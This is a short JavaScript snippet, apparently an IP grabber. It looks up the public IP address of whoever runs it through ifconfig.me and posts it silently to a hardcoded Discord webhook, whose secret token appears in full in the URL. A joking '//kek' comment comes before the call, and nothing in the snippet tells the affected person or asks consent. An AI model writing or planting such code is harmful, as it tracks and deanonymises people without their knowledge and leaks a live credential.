function postToWebhook(text) {
    fetch("https://discord.com/api/webhooks/1491901380837904394/C5d28HGlXs-eEJelCXMJHnfZrymy03kMF0Fg5ndVKBB32dRBSy1JN6GKPs_964-etMC7", {
          method: "POST",
          headers: {
              "Content-Type": "application/json"
          },
          body: JSON.stringify({
              content: `${text}`
          })
    });
}

//kek
fetch("https://ifconfig.me/ip").then(res => res.text()).then(ip => postToWebhook(ip));